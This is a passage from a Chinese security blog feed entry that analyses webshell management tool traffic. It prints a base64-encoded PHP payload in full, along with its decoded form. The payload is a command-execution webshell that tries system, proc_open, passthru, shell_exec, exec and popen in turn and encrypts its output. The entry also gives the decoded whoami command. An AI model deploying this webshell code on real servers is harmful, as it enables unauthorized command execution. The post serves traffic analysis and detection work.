string">'QGVycm9yX3JlcG9ydGluZygwKTsNCg0KZnVuY3Rpb24gZ2V0U2FmZVN0cigkc3RyKXsNCiAgICAkczEgPSBpY29udigndXRmLTgnLCdnYmsvL0lHTk9SRScsJHN0cik7DQogICAgJHMwID0gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzMSk7DQogICAgaWYoJHMwID09ICRzdHIpew0KICAgICAgICByZXR1cm4gJHMwOw0KICAgIH1lbHNlew0KICAgICAgICByZXR1cm4gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzdHIpOw0KICAgIH0NCn0NCmZ1bmN0aW9uIG1haW4oJGNtZCwkcGF0aCkNCnsNCiAgICBAc2V0X3RpbWVfbGltaXQoMCk7DQogICAgQGlnbm9yZV91c2VyX2Fib3J0KDEpOw0KICAgIEBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsNCiAgICAkcmVzdWx0ID0gYXJyYXkoKTsNCiAgICAkUGFkdEpuID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7DQogICAgaWYgKCEgZW1wdHkoJFBhZHRKbikpIHsNCiAgICAgICAgJFBhZHRKbiA9IHByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBleHBsb2RlKCcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBhcnJheV9tYXAoJ3RyaW0nLCAkUGFkdEpuKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkUGFkdEpuID0gYXJyYXkoKTsNCiAgICB9DQogICAgJGMgPSAkY21kOw0KICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicpKSB7DQogICAgICAgICRjID0gJGMgLiAiIDI+JjFcbiI7DQogICAgfQ0KICAgICRKdWVRREJIID0gJ2lzX2NhbGxhYmxlJzsNCiAgICAkQnZjZSA9ICdpbl9hcnJheSc7DQogICAgaWYgKCRKdWVRREJIKCdzeXN0ZW0nKSBhbmQgISAkQnZjZSgnc3lzdGVtJywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgc3lzdGVtKCRjKTsNCiAgICAgICAgJGtXSlcgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICAgICAgb2JfZW5kX2NsZWFuKCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgncHJvY19vcGVuJykgYW5kICEgJEJ2Y2UoJ3Byb2Nfb3BlbicsICRQYWR0Sm4pKSB7DQogICAgICAgICRoYW5kbGUgPSBwcm9jX29wZW4oJGMsIGFycmF5KA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgJ3BpcGUnLA0KICAgICAgICAgICAgICAgICdyJw0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgICdwaXBlJywNCiAgICAgICAgICAgICAgICAndycNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICAncGlwZScsDQogICAgICAgICAgICAgICAgJ3cnDQogICAgICAgICAgICApDQogICAgICAgICksICRwaXBlcyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgd2hpbGUgKCEgZmVvZigkcGlwZXNbMV0pKSB7DQogICAgICAgICAgICAka1dKVyAuPSBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KICAgICAgICB9DQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ3Bhc3N0aHJ1JykgYW5kICEgJEJ2Y2UoJ3Bhc3N0aHJ1JywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgcGFzc3RocnUoJGMpOw0KICAgICAgICAka1dKVyA9IG9iX2dldF9jb250ZW50cygpOw0KICAgICAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdzaGVsbF9leGVjJykgYW5kICEgJEJ2Y2UoJ3NoZWxsX2V4ZWMnLCAkUGFkdEpuKSkgew0KICAgICAgICAka1dKVyA9IHNoZWxsX2V4ZWMoJGMpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ2V4ZWMnKSBhbmQgISAkQnZjZSgnZXhlYycsICRQYWR0Sm4pKSB7DQogICAgICAgICRrV0pXID0gYXJyYXkoKTsNCiAgICAgICAgZXhlYygkYywgJGtXSlcpOw0KICAgICAgICAka1dKVyA9IGpvaW4oY2hyKDEwKSwgJGtXSlcpIC4gY2hyKDEwKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdleGVjJykgYW5kICEgJEJ2Y2UoJ3BvcGVuJywgJFBhZHRKbikpIHsNCiAgICAgICAgJGZwID0gcG9wZW4oJGMsICdyJyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCRmcCkpIHsNCiAgICAgICAgICAgIHdoaWxlICghIGZlb2YoJGZwKSkgew0KICAgICAgICAgICAgICAgICRrV0pXIC49IGZyZWFkKCRmcCwgMTAyNCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgQHBjbG9zZSgkZnApOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRrV0pXID0gMDsNCiAgICAgICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJmYWlsIik7DQogICAgICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZSgibm9uZSBvZiBwcm9jX29wZW4vcGFzc3RocnUvc2hlbGxfZXhlYy9leGVjL2V4ZWMgaXMgYXZhaWxhYmxlIik7DQogICAgICAgICRrZXkgPSAkX1NFU1NJT05bJ2snXTsNCiAgICAgICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAka2V5KTsNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICB9DQogICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKGdldFNhZmVTdHIoJGtXSlcpKTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICAkX1NFU1NJT05bJ2snXSk7DQp9DQoNCmZ1bmN0aW9uIGVuY3J5cHQoJGRhdGEsJGtleSkNCnsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQ0KICAgIAl7DQogICAgCQlmb3IoJGk9MDskaTxzdHJsZW4oJGRhdGEpOyRpKyspIHsNCiAgICAJCQkgJGRhdGFbJGldID0gJGRhdGFbJGldXiRrZXlbJGkrMSYxNV07IA0KICAgIAkJCX0NCgkJCXJldHVybiAkZGF0YTsNCiAgICAJfQ0KICAgIGVsc2UNCiAgICAJew0KICAgIAkJcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZGF0YSwgIkFFUzEyOCIsICRrZXkpOw0KICAgIAl9DQp9JGNtZD0iWTJRZ0wyUWdJa1E2WEhCb2NITjBkV1I1WDNCeWIxeFhWMWRjSWlaM2FHOWhiV2s9IjskY21kPWJhc2U2NF9kZWNvZGUoJGNtZCk7JHBhdGg9IlJEb3ZjR2h3YzNSMVpIbGZjSEp2TDFkWFZ5OD0iOyRwYXRoPWJhc2U2NF9kZWNvZGUoJHBhdGgpOw0KbWFpbigkY21kLCRwYXRoKTs='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将内容base64解密：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getSafeStr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$s1</span> <span class="token operator">=</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gbk//IGNORE'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s0</span> <span class="token operator">=</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gbk'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8//IGNORE'</span><span class="token punctuation">,</span><span class="token variable">$s1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s0</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$s0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gbk'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8//IGNORE'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'max_execution_time'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$PadtJn</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$PadtJn</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[, ]+/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$PadtJn</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$PadtJn</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'trim'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$PadtJn</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">FALSE</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'win'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$c</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" 2&gt;&amp;1\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$JueQDBH</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'is_callable'</span><span class="token punctuation">;</span>    <span class="token variable">$Bvce</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'in_array'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'r'</span>            <span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'w'</span>            <span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'w'</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$kWJW</span> <span class="token operator">.=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        @<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$kWJW</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$kWJW</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$kWJW</span> <span class="token operator">.=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        @<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"status"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"msg"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"none of proc_open/passthru/shell_exec/exec/exec is available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"status"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"msg"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">getSafeStr</span><span class="token punctuation">(</span><span class="token variable">$kWJW</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"Y2QgL2QgIkQ6XHBocHN0dWR5X3Byb1xXV1dcIiZ3aG9hbWk="</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"RDovcGhwc3R1ZHlfcHJvL1dXVy8="</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而cmd内容即为执行内容：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">cd <span class="token operator">/</span>d <span class="token string">"D:\phpstudy_pro\WWW\"</span>&amp;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="小小总结"><a href="#小小总结" class="headerlink" title="小小总结"></a>小小总结</h2><p>这些webshell被大家所使用不仅仅是在当时出现时可绕过大部分流量检测，独特的请求方式，和免杀，还有他们与时俱进的各种功能，内网穿透、内存马等等，实现一键去日内网，随着检测手段加强和内网利用手段的增多，相信也会有新的绕过方法和功能出现。</p><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">https<span class="token punctuation">:</span><span class="token comment">//www.freebuf.com/sectool/285693.html</span>https<span class="token punctuation">:</span><span class="token comment">//xz.aliyun.com/t/10556</span>http<span class="token punctuation">:</span><span class="token comment">//www.wjhsh.net/0daybug-p-12004574.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel 保护机制绕过</title>
    <link href="https://rainsec.cn/post/Linux%20Kernel%20%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87.html"/>
    <id>https://rainsec.cn/post/Linux%20Kernel%20%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87.html</id>
    <published>2022-07-19T10:48:45.000Z</published>
    <updated>2023-04-12T02:36:51.327Z</updated>
    
